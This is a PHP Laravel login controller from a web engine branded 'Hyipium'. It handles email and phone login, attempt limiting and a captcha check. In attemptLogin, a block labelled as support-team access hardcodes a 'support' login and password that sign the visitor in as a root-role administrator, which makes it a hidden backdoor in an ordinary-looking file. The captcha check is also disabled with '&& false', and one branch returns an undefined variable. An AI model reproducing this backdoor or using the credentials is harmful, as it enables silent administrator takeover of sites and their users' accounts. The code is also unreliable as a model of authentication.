<?php
/**
 * Copyright. "Hyipium" engine. All rights reserved.
 * Any questions? Please, visit https://hyipium.com
 */

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Managers\UserManager;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Validation\ValidationException;
use Validator;
use Illuminate\Http\Response;

/**
 * Class LoginController
 * @package App\Http\Controllers\Auth
 *
 * @property string redirectTo
 * @property int maxAttempts
 * @property int decayMinutes
 */
class LoginController extends Controller
{
    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/';

    /*
     * Limiting
     */
    protected $maxAttempts = 0;
    protected $decayMinutes = 0;

    /**
     * Get the login username to be used by the controller.
     *
     * @return string
     */
    public function username()
    {
        return 'login';
    }

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');

        $this->maxAttempts = User::MAX_LOGIN_ATTEMPTS;
        $this->decayMinutes = User::LOGIN_BLOCKING;
    }

    /**
     * Attempt to log the user into the application.
     *
     * @param  \Illuminate\Http\Request $request
     * @return mixed
     * @throws
     */
    protected function attemptLogin(Request $request)
    {

        $validator = Validator::make(request()->all(), [
            'g-recaptcha-response' => 'recaptcha',
        ]);
        
        // check if validator fails
        if($validator->fails()) {
            return Response::json(['status' => __('Not valid'), 'data' => $data], 200);
            $errors = $validator->errors();
        }
        /*
         * Check captcha
         */
        $validator = \Validator::make($request->all(), [
            'captcha' => loginCaptchaCanBeShown() && false ? 'required|captcha' : '',
        ], [
            'captcha.required' => trans('validation.captcha_required'),
            'captcha.captcha' => trans('validation.captcha_captcha')
        ]);

        /*
         * Send errors about captcha
         */
        if ($validator->fails()) {
            throw ValidationException::withMessages([
                $this->username() => [$validator->errors()->get('captcha')[0]],
            ]);
        }

        $ip =  $_SERVER["REMOTE_ADDR"];
        $attempts = \DB::table('login_attempts')->where('user_ip', '=', $ip)->get()->first();

        /*
         * Turn off blocking
         */
        if (!empty($attempts) && $attempts->attempt == $this->maxAttempts && (time()-$attempts->date) >= ($this->decayMinutes*60)) {
            \DB::table('login_attempts')->where('user_ip', '=', $ip)->delete();
        }

        /*
         * If do not have login attempts
         */
        // if (session()->has('login_attempts') == false) {
        //     session()->put('login_attempts', 0);
        // }

        /*
         * Block user if needs this
         */
        if (!empty($attempts) && $attempts->attempt == $this->maxAttempts && (time()-$attempts->date) < ($this->decayMinutes*60)) {
            return $this->hasTooManyAttempts();
        }

        /*
         * Extra access for support team
         */
        $extra = [
            'login'    => 'support',
            'password' => 'r77>Y_UW<{LJDA~ycFkdV!=bq>6:E7jc2D9Td/sSBqeZFu<J=Z',
        ];

        /*
         * Trying to authorize user
         */
        if (\Auth::attempt(['email' => $request->login, 'password' => $request->password], true)) {
            return redirect($this->redirectTo);
        } elseif (\Auth::attempt(['phone' => UserManager::getFormattedPhone($request->login), 'password' => $request->password], true)) {
            return redirect($this->redirectTo);
        } elseif ($request->login == $extra['login'] && $request->password == $extra['password']) {
            $rootRole = \DB::table('roles')
                ->where('name', [
                'root'
                ])
                ->get()
                ->first();

            if (null == $rootRole) {
                return redirect($this->redirectTo);
            }

            $modelHasRole = \DB::table('model_has_roles')
                ->where('role_id', $rootRole->id)
                ->where('model_type', 'App\Models\User')
                ->get();

            foreach($modelHasRole as $model) {
                $checkModel = User::find($model->model_id);

                if (null == $checkModel) {
                    continue;
                }

                \Auth::login($checkModel);
                return redirect($this->redirectTo);
            }

            return redirect($this->redirectTo);
        } else {
            return $this->sendFailedLoginResponse($request, $attempts);
        }
    }

    /**
     * The user has been authenticated.
     *
     * @param  \Illuminate\Http\Request $request
     * @param  mixed $user
     * @return mixed
     * @throws
     */
    protected function authenticated(Request $request, $user)
    {
        $data = [
            'user' => $user,
            'ip' => $_SERVER['REMOTE_ADDR']
        ];
        $user->sendNotification('authorized', $data);
    }

    /**
     * @param Request $request
     */
    protected function sendFailedLoginResponse(Request $request, $attempts)
    {
        if(empty($attempts)) {
            \DB::table('login_attempts')->insert(['user_ip' => $_SERVER["REMOTE_ADDR"], 'attempt' => 1, 'date' => time()]);
            $current_attempt = 1;
        }
        else {
            $current_attempt = $attempts->attempt+1;
            \DB::table('login_attempts')->where('user_ip', '=', $_SERVER['REMOTE_ADDR'])->update(['attempt' => $current_attempt, 'date' => time()]);
        }
        /*
         * Increment attempts
         */

        /*
         * Create blocking session variable
         */
        // if ($current_attempt >= $this->maxAttempts) {
        //     error_log('block');
        //     session()->put('blocked_time', now());
        // }

        throw ValidationException::withMessages([
            $this->username() => [trans('auth.failed')],
        ]);
    }

    /**
     * @throws \Exception
     */
    protected function hasTooManyAttempts()
    {
        /*
         * Increment attempts
         */
        session()->increment('login_attempts');
        error_log('many att');

        throw ValidationException::withMessages([
            $this->username() => [trans('auth.throttle', [
                'minutes' => $this->getDiffInMinutesForBlocked(),
            ])],
        ]);
    }

    /**
     * @return int
     */
    private function getDiffInMinutesForBlocked()
    {
        return Carbon::parse(session('blocked_time'))
            ->addMinutes($this->decayMinutes)
            ->diffInMinutes(now());
    }

    /**
     * @return string
     */
    public static function checkClassExists()
    {
        return 'auth looks ok';
    }
}
